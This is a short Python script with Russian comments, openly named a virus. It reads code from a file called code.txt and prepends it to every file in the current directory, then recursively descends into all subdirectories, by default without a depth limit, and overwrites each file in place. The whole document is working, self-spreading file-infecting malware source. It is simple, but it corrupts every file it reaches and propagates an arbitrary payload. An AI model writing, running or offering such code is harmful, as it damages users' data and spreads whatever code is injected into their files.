# -*- coding: utf-8 -*-
import os
from os.path import isfile

# Максимальное кол-во углублений
# по директориям вниз для работы в них программы
max_deep = None

# Имена файлов для игнорирования
ignore = ['virus.py', 'code.txt', 'tests.py']

# Получаем код, для добавление в начало всех файлов
with open('code.txt', 'r', encoding='utf-8') as file:
    code = file.readlines()

def startInvasion(deep=1, path='.'):
    '''Рекурсивная функция, запускающая вирус.
    1. Вставление кода во все файлы текущей директории,
    2. переход в каждую из внутренних директорий и
    3. вызов оттуда самой себя

    Аргументы:
        deep - количество директорий вглубь,
               относительно начальной
        path - текущая директория, в которой ищем директории,
               для дальнейшей работы программы

    '''
    # Если кол-во шагов вглубь указано:
    if max_deep is not None:
        # Если кол-во шагов вглубь превышено:
        if deep > max_deep:
            return
    # Список файлов и директорий в текущей директории
    files_n_dirs = os.listdir(path=path)
    # Список исключительно файлов в текущей директории
    files = [path+'/'+f for f in files_n_dirs if isfile(path+'/'+f) and f not in ignore]
    # Список исключительно директорий в текущей директории
    dirs = [path+'/'+d for d in files_n_dirs if path+'/'+d not in files and d not in ignore]
    print('deep= {}'.format(str(deep)))
    '''print('path= {}'.format(path))
    print('files_n_dirs= {}'.format(str(files_n_dirs)))
    print('files= {}'.format(str(files)))
    print('dirs= {}'.format(str(dirs)))'''

    # Вставляем пользовательский код в начало каждого файла
    for name in files:
        with open(name, 'r', encoding='utf-8') as file:
            # Список, содержащий строки файла
            lines = file.readlines()
        # Добавляем код пользователя в начало считанного файла
        result = code
        result = code + lines
        # Записываем содержимое файла с кодом
        # пользователя в начале обратно в файл
        with open(name, 'w', encoding='utf-8') as file:
            for line in result:
                file.write(line)
        print('File: "{}" overwritten'.format(name))
        print('Next dirs are: {}'.format(', '.join(dirs)))

    # Вызываем эту же функцию для всех внутренних директорий
    for directory in dirs:
        startInvasion(deep=deep+1, path=directory)

# Начинаем работу вируса из текущей директории
startInvasion()
